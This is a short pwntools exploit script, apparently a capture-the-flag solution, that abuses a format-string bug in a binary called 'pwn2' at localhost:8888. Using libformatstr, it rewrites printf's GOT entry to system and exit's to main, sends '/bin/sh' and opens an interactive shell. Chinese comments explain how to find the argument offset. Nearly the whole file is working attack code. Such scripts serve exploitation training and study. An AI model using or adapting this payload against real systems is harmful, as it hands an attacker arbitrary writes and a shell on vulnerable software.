# coding:utf-8
# 格式化串漏洞，使用libformatstr

from pwn import *

# https://github.com/hellman/libformatstr
import libformatstr

#context.log_level= 'debug'
#io = process('./pwn2')
io = remote('localhost', 8888)
e = ELF('./pwn2')
#libc = ELF('/lib32/libc.so.6')

# libformatstr应用于格式化串在栈中，使得参数也可控的情况，可以实现任意读写
# 生成pattern串判断参数在格式化串的位置 
#BUF_SZ = 80  # 格式化串的长度
#pat = libformatstr.make_pattern(BUF_SZ)
#io.sendline(pat)
#res = io.recv()
# argnum 表示第argnum个参数位于格式化串首部
# padding 表示使参数对齐需要添加的字节数 0-3
#argnum, padding = libformatstr.guess_argnum(res, BUF_SZ)
#log.info('argnum:%d padding:%d'%(argnum, padding))
# 6, 0

# 写入printf.got为system
argnum = 6
padding = 0
p = libformatstr.FormatStr()
p[e.got['printf']]= e.plt['system']
p[e.got['exit']] = 0x080485EE # main
fmt_str = p.payload(argnum, padding, start_len=0) # 0 表示之前打印出的字符
log.info('payload:\n %s' % hexdump(fmt_str))

io.sendline(fmt_str)
io.recv()
io.sendline('/bin/sh')
io.interactive()

io.interactive()